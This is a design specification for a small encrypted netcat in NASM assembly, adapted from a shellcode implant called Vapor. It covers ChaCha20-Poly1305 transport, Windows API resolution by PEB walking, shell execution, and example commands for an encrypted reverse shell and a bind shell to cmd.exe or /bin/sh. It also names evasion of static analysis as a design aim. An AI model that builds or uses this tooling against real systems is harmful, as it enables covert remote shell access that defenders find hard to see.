# Encrypted Static Netcat — Design Spec

## Overview

Pure x86-64 NASM assembly encrypted netcat with ChaCha20-Poly1305 AEAD and optional shell execution. Two platform-specific codebases (Linux syscalls, Windows Win32) cross-compiled from Linux. Pre-shared key authentication for v1, X25519 key exchange planned for v2.

Reuses Vapor's ChaCha20-Poly1305 crypto implementation and wire protocol from [Vapor](https://github.com/Real-Fruit-Snacks/Vapor). All other components (listen mode, bidirectional relay, CLI parsing, Linux codebase, Windows threading) are new code — Vapor is a connect-only Windows shellcode implant with a command-response loop, not a general-purpose netcat.

## Goals

- Static, dependency-free binaries: ~5-10KB (Linux ELF), ~10-20KB (Windows PE)
- Authenticated encryption on all traffic (ChaCha20-Poly1305, RFC 8439)
- Bidirectional streaming relay (full-duplex)
- Listen and connect modes
- Optional shell execution (`-e` flag)
- Cross-compiled from Linux for both platforms
- 64-bit only for v1; 32-bit planned for v2

## Non-Goals (v1)

- X25519 key exchange (v2)
- 32-bit support (v2)
- File transfer mode
- Port scanning
- SOCKS proxy / port forwarding
- Native Windows build support

## CLI Interface

```
Usage: ncat [-l] [-c <host>] -p <port> -k <hex-key> [-e <cmd>]

  -l            Listen mode (bind and accept one connection)
  -c <host>     Connect mode (connect to host)
  -p <port>     Port number (required)
  -k <key>      256-bit pre-shared key as 64-char hex string (required)
  -e <cmd>      Execute command and pipe through encrypted channel

Examples:
  # Encrypted listener with shell
  ncat -l -p 4444 -k <64-char-hex> -e /bin/sh

  # Encrypted connect
  ncat -c 10.10.10.1 -p 4444 -k <64-char-hex>

  # Encrypted reverse shell
  ncat -c 10.10.10.1 -p 4444 -k <64-char-hex> -e cmd.exe
```

Flags are parsed by walking argv pointers. No getopt, no libc. IP addresses parsed into 32-bit network-order integers. Port parsed into 16-bit network byte order. Key parsed from hex string into 32 bytes on the stack.

## Architecture

```
                    CLI Argument Parsing
                            |
                    +-------+-------+
                    |               |
              -l (listen)     -c (connect)
                    |               |
              bind/listen      connect()
              accept()              |
                    +-------+-------+
                            |
                ChaCha20-Poly1305 channel init
                     (PSK from -k flag)
                            |
                    +-------+-------+
                    |               |
              -e provided?     no -e flag
                    |               |
              spawn process    stdin/stdout
              pipe stdio       pipe through
              through crypto   crypto channel
                    |               |
                    +-------+-------+
                            |
                  Bidirectional relay loop
                  (poll/select on Linux,
                   threads on Windows)
```

## Components

### 1. Entry & CLI Parsing

**Input:** argc in rdi (Linux) or rcx (Windows), argv pointer array.

Walk argv sequentially. For each element, compare first two bytes against known flags (`-l`, `-c`, `-p`, `-k`, `-e`). Flags with arguments consume the next argv element.

**Parsed state (stored in .bss or stack frame):**
- `mode`: byte, 0 = connect, 1 = listen
- `host`: dword, IPv4 in network byte order (connect mode only)
- `port`: word, network byte order
- `key`: 32 bytes
- `exec_cmd`: qword, pointer to command string (0 if no -e)

**Error handling:** If required flags missing (-p, -k) or conflicting (-l and -c both set), write error message to stderr and exit.

### 2. Networking

#### Linux (direct syscalls)

All networking via `syscall` instruction. Syscall numbers for x86-64:

| Syscall | Number |
|---------|--------|
| socket | 41 |
| bind | 49 |
| listen | 50 |
| accept | 43 |
| connect | 42 |
| read | 0 |
| write | 1 |
| close | 3 |
| poll | 7 |
| fork | 57 |
| execve | 59 |
| dup2 | 33 |
| pipe | 22 |
| exit | 60 |
| waitpid | 61 |

**Listen mode:** `socket(AF_INET, SOCK_STREAM, 0)` -> `bind(sockfd, &addr, 16)` -> `listen(sockfd, 1)` -> `accept(sockfd, NULL, NULL)`. Close listening fd after accept.

**Connect mode:** `socket(AF_INET, SOCK_STREAM, 0)` -> `connect(sockfd, &addr, 16)`.

`sockaddr_in` structure built on the stack: `AF_INET (2)`, port (network order), IP addr (network order), 8 bytes padding.

#### Windows (ws2_32.dll)

Resolve APIs via PEB walking (reuse Vapor's `find_kernel32` and `resolve_hash` patterns, extended to also find `ws2_32.dll`).

**Required APIs (resolved via PEB walking + ror13 hashing):**
- `kernel32.dll`: `CreateProcessA`, `CreateThread`, `WaitForSingleObject`, `WaitForMultipleObjects`, `CreatePipe`, `ReadFile`, `WriteFile`, `CloseHandle`, `ExitProcess`, `GetCommandLineA`, `SetHandleInformation`, `TerminateProcess`, `LoadLibraryA`, `GetProcAddress`, `GetStdHandle`
- `ws2_32.dll`: `WSAStartup`, `socket`, `bind`, `listen`, `accept`, `connect`, `send`, `recv`, `closesocket`
- `advapi32.dll`: `SystemFunction036` (RtlGenRandom) — for CSPRNG nonce generation. Resolved via `LoadLibraryA("advapi32.dll")` + `GetProcAddress`, NOT PEB walking (same approach as Vapor — advapi32 may not be loaded in the process, so `LoadLibraryA` is required)

**Note on new APIs vs Vapor:** Vapor only resolves `kernel32.dll` and `ws2_32.dll` via PEB walking, and only uses connect-mode socket APIs. The following are entirely new for this project and require computing new ror13 hashes: `CreateThread`, `WaitForMultipleObjects`, `SetHandleInformation`, `GetCommandLineA`, `TerminateProcess`, `bind`, `listen`, `accept`. `advapi32.dll` is loaded at runtime via `LoadLibraryA`/`GetProcAddress` (already in kernel32 API list), matching Vapor's actual approach.

**Argument parsing on Windows:** Since there is no CRT, `main(argc, argv)` is not available. Use `GetCommandLineA` to get the raw command line string. Parsing steps:
1. Skip the executable name prefix (first token — may be quoted if path contains spaces)
2. Split remaining string on whitespace
3. No quoted argument support for `-e` in v1 — command must be a single token (e.g., `cmd.exe`, not `cmd /c dir`). Multi-word commands can use `-e cmd.exe` and then type commands interactively through the encrypted channel.

**Listen/Connect logic:** Same flow as Linux but using resolved API function pointers from the API table.

### 3. ChaCha20-Poly1305 (Adapted from Vapor)

Reuse Vapor's proven assembly implementation of RFC 8439 ChaCha20-Poly1305.

#### ChaCha20 Core

State matrix: 16 x 32-bit words arranged as:
```
cccccccc  cccccccc  cccccccc  cccccccc
kkkkkkkk  kkkkkkkk  kkkkkkkk  kkkkkkkk
kkkkkkkk  kkkkkkkk  kkkkkkkk  kkkkkkkk
bbbbbbbb  nnnnnnnn  nnnnnnnn  nnnnnnnn
```
Where c = constants ("expand 32-byte k"), k = key, b = block counter, n = nonce.

Quarter-round function: `a += b; d ^= a; d <<<= 16; c += d; b ^= c; b <<<= 12; a += b; d ^= a; d <<<= 8; c += d; b ^= c; b <<<= 7`

10 double-rounds (column rounds + diagonal rounds) = 20 total rounds. Add original state to output. Produces 64 bytes of keystream per block.

#### Poly1305 MAC

- Clamp r from first 16 bytes of poly1305 key
- Process 16-byte blocks of AAD (empty for our use) and ciphertext
- Accumulate: `a = ((a + block) * r) mod (2^130 - 5)`
- Final: `tag = (a + s) mod 2^128`

Vapor's implementation handles the 130-bit modular arithmetic using 64-bit registers with carry propagation.

#### AEAD Encrypt/Decrypt

**Encrypt:**
1. Generate poly1305 key: ChaCha20 block with counter=0, take first 32 bytes
2. Encrypt plaintext: ChaCha20 stream starting at counter=1, XOR with plaintext
3. Compute tag: Poly1305 over (AAD_padded || ciphertext_padded || AAD_len || ciphertext_len)
4. Output: nonce || ciphertext || tag

**Decrypt:**
1. Generate poly1305 key from nonce with counter=0
2. Compute expected tag over received ciphertext
3. Constant-time compare tag (prevent timing attacks)
4. If match: decrypt ciphertext with ChaCha20 counter=1
5. If mismatch: drop message, close connection

### 4. Wire Protocol

Same as Vapor's proven format:

```
[4 bytes: little-endian payload length (nonce + ciphertext + tag)]
[12 bytes: random nonce]
[N bytes: ciphertext]
[16 bytes: Poly1305 tag]
```

Maximum message size: 65,536 bytes (64KB). Length field validated before allocation.

**Nonce generation:**
- Linux: Read 12 bytes from `/dev/urandom` via `open(2)` + `read(2)` (syscalls 2 + 0)
- Windows: `SystemFunction036` (RtlGenRandom) from `advapi32.dll` — resolved via `LoadLibraryA`/`GetProcAddress`, NOT PEB walking (see required APIs above).

**recv_exact / send_all:** Loop wrappers ensuring complete reads/writes (reuse Vapor's pattern). Handle partial reads/writes and connection drops.

### 5. Shell Execution

#### Linux

```
pipe(stdin_pipe)   // Create two pipes
pipe(stdout_pipe)
fork()
  child:
    dup2(stdin_pipe[0], 0)    // Redirect stdin
    dup2(stdout_pipe[1], 1)   // Redirect stdout
    dup2(stdout_pipe[1], 2)   // Redirect stderr
    close unused fds
    execve(cmd, [cmd, NULL], NULL)
  parent:
    close unused pipe ends
    relay loop between socket and pipe fds
```

#### Windows

Adapted from Vapor's `CreateProcessA` pattern, extended with pipes (Vapor uses anonymous pipes but no stdin redirection):
```
CreatePipe(&stdin_read, &stdin_write, &sa_inherit, 0)
CreatePipe(&stdout_read, &stdout_write, &sa_inherit, 0)
SetHandleInformation(stdin_write, HANDLE_FLAG_INHERIT, 0)   // parent's write end not inherited
SetHandleInformation(stdout_read, HANDLE_FLAG_INHERIT, 0)   // parent's read end not inherited
STARTUPINFO.hStdInput  = stdin_read
STARTUPINFO.hStdOutput = stdout_write
STARTUPINFO.hStdError  = stdout_write
STARTUPINFO.dwFlags    = STARTF_USESTDHANDLES
CreateProcessA(NULL, cmd, ..., bInheritHandles=TRUE, ..., &si, &pi)
CloseHandle(stdin_read)     // close child's ends in parent
CloseHandle(stdout_write)
Relay loop between socket and pipe handles (stdout_read, stdin_write)
```

### 6. Bidirectional Relay Loop

The core I/O loop that shuttles data between the network socket and stdin/stdout (or shell pipes). **This is entirely new code — Vapor uses a command-response loop (recv command, exec, send output, repeat), not a streaming relay.**

#### Linux (poll-based)

```
poll([socket_fd, local_fd], 2, -1)
if socket_fd readable:
    recv_exact(length header, 4 bytes)
    validate length <= 65536, else close connection
    recv_exact(encrypted payload, length bytes)
    aead_decrypt(payload) -> plaintext
    if MAC verification fails: close connection, exit(1)
    write(local_fd, plaintext)  // stdout or shell stdin pipe
if local_fd readable:
    read(local_fd, buffer)      // stdin or shell stdout pipe
    if read returns 0: EOF, cleanup and exit(0)
    aead_encrypt(buffer) -> payload
    send_all(length header + payload)
if either fd has POLLERR or POLLHUP:
    cleanup and exit(0)
```

**Error handling:**
- `recv_exact` returns 0 or -1: connection dropped. Close all fds, kill child process (if -e), exit(0).
- Partial encrypted message (connection drops mid-payload): discard buffer, close connection, exit(1).
- No graceful shutdown protocol — either side can close at any time. The other side detects via read returning 0.

#### Windows (threaded)

**This has no Vapor precedent.** Vapor uses single-threaded `PeekNamedPipe` polling. This design uses two threads for true full-duplex.

Two threads created with `CreateThread` (stack size: 0 = default 1MB):

**Thread 1 (socket -> local):**
```
loop:
    recv_exact(socket, length header, 4 bytes)
    validate length <= 65536, else break
    recv_exact(socket, encrypted payload, length bytes)
    aead_decrypt -> plaintext
    if MAC fails: break
    WriteFile(local_handle, plaintext)  // stdout or shell stdin pipe
ExitThread(0)
```

**Thread 2 (local -> socket):**
```
loop:
    ReadFile(local_handle, buffer)      // stdin or shell stdout pipe
    if ReadFile returns FALSE or 0 bytes: break (EOF/pipe closed)
    aead_encrypt -> payload
    send_all(socket, length header + payload)
ExitThread(0)
```

**Thread entry points** follow the Windows x64 calling convention: single LPVOID parameter in rcx, DWORD return value.

Main thread calls `WaitForMultipleObjects(2, [thread1, thread2], FALSE, INFINITE)` — returns when EITHER thread exits. Then calls `CloseHandle` on both threads, closes socket, kills child process (if -e via `TerminateProcess`), and calls `ExitProcess(0)`.

**Thread synchronization:** No mutex needed. Each thread owns its own crypto direction — thread 1 only decrypts (with its own nonce state), thread 2 only encrypts (with its own nonce state). The socket handle is shared but `send` and `recv` on separate threads is safe on Windows.

### 7. Binary Format

#### Linux ELF

Handcrafted minimal ELF64 header:
- ELF header: 64 bytes
- Single LOAD program header: 56 bytes
- No section headers (not needed for execution)
- Single segment containing all code and data
- Entry point directly at `_start`

Build: `nasm -f elf64 -o ncat.o` -> `ld -o ncat ncat.o --strip-all`

#### Windows PE

Handcrafted PE with minimal headers:
- DOS stub: 64 bytes (just MZ + e_lfanew pointer)
- PE signature + COFF header: 24 bytes
- Optional header: 240 bytes
- Single .text section header: 40 bytes
- Import directory for kernel32.dll, ws2_32.dll (or resolve all at runtime via PEB like Vapor)

Build: `nasm -f win64 -o ncat.obj` -> `x86_64-w64-mingw32-ld -o ncat.exe ncat.obj --strip-all`

**Note:** If using PEB walking for all API resolution (Vapor pattern), no import table is needed — the PE can have zero imports, making it smaller and harder to statically analyze.

## File Structure

```
netcat/
├── Makefile
├── build.sh                  # Build script with key generation (adapted from Vapor)
├── shared/
│   ├── chacha20.inc          # ChaCha20 quarter-round macros (platform-agnostic)
│   ├── poly1305.inc          # Poly1305 MAC macros (platform-agnostic)
│   └── aead.inc              # AEAD encrypt/decrypt orchestration macros
├── linux/
│   ├── main.asm              # ELF entry, arg parsing, main orchestration
│   ├── net.asm               # Socket syscall wrappers
│   ├── crypto.asm            # Platform-specific crypto setup (nonce from /dev/urandom)
│   ├── shell.asm             # fork/execve/dup2
│   └── io.asm                # poll-based relay loop
└── windows/
    ├── main.asm              # PE entry, GetCommandLineA parsing, main orchestration
    ├── peb.asm               # PEB walking, API resolution (from Vapor)
    ├── net.asm               # ws2_32 socket wrappers
    ├── crypto.asm            # Platform-specific crypto setup (RtlGenRandom via advapi32.dll)
    ├── shell.asm             # CreateProcessA/CreatePipe
    └── io.asm                # Threaded relay loop
```

### Shared Macros

The `shared/` directory contains NASM macros for the pure arithmetic portions of ChaCha20-Poly1305. These are platform-agnostic — just register operations (add, xor, rotate) with no syscalls or API calls. Platform-specific files `%include` these macros and handle state setup, nonce generation, and I/O.

### File Inclusion Model

Each platform compiles as a **single compilation unit**. `main.asm` uses `%include` to pull in all other `.asm` files for that platform plus the shared `.inc` macros. No separate object files, no linking multiple `.o` files. This keeps the Makefile simple and avoids cross-file symbol resolution complexity in NASM.

```nasm
; linux/main.asm example structure
%include "chacha20.inc"
%include "poly1305.inc"
%include "aead.inc"
%include "net.asm"
%include "crypto.asm"
%include "shell.asm"
%include "io.asm"

_start:
    ; entry point, arg parsing, orchestration
```

## Build System

```makefile
# Adapted from Vapor's build
NASM = nasm
LD_LINUX = ld
LD_WIN = x86_64-w64-mingw32-ld

all: linux windows

linux:
	$(NASM) -f elf64 -I shared/ -o build/ncat.o linux/main.asm
	$(LD_LINUX) -o build/ncat build/ncat.o --strip-all

windows:
	$(NASM) -f win64 -I shared/ -o build/ncat.obj windows/main.asm
	$(LD_WIN) -o build/ncat.exe build/ncat.obj --strip-all

clean:
	rm -f build/*
```

`build.sh` wraps the Makefile, generates a random PSK, and reports binary sizes:
```bash
#!/bin/bash
KEY=$(python3 -c "import secrets; print(secrets.token_hex(32))")
echo "[*] Generated PSK: $KEY"
make all
echo "[*] Linux binary: $(wc -c < build/ncat) bytes"
echo "[*] Windows binary: $(wc -c < build/ncat.exe) bytes"
```

Note: Unlike Vapor, the key is NOT baked into the binary. It's passed at runtime via `-k`. The build script generates a key for convenience and prints it for the operator.

## Security Considerations

- **Constant-time MAC comparison** in aead_decrypt to prevent timing side-channels (reuse Vapor's approach)
- **Nonce uniqueness** guaranteed by random generation from OS CSPRNG — no counter reuse risk even across sessions
- **No plaintext on the wire** — all traffic after connection is encrypted
- **No import table** (Windows) — PEB walking makes static analysis harder
- **Key handling** — key is on the stack, zeroed on exit. Not persisted to disk.
- **No libc dependency** — entire binary is self-contained, no dynamic linking, no loader needed beyond kernel

## Testing Plan

1. **Unit testing crypto:** Encrypt with assembly implementation, decrypt with Python (`cryptography` library) and vice versa. Use RFC 8439 test vectors.
2. **Cross-platform relay:** Linux listener <-> Windows connector and vice versa.
3. **Shell execution:** Verify `-e /bin/sh` on Linux and `-e cmd.exe` on Windows produce interactive encrypted shells.
4. **Edge cases:** Empty messages, maximum-size messages (64KB), rapid send/receive, connection drops mid-transfer.
5. **Wireshark verification:** Capture traffic, confirm no plaintext visible.

## Milestones

### v1 (This spec)
- 64-bit Linux + Windows
- ChaCha20-Poly1305 with PSK
- Listen + connect modes
- Optional shell execution
- Bidirectional encrypted relay

### v2 (Future)
- X25519 Diffie-Hellman key exchange (forward secrecy)
- 32-bit Linux + Windows builds
- File transfer mode
- Multiple concurrent connections (listener accepts more than one)
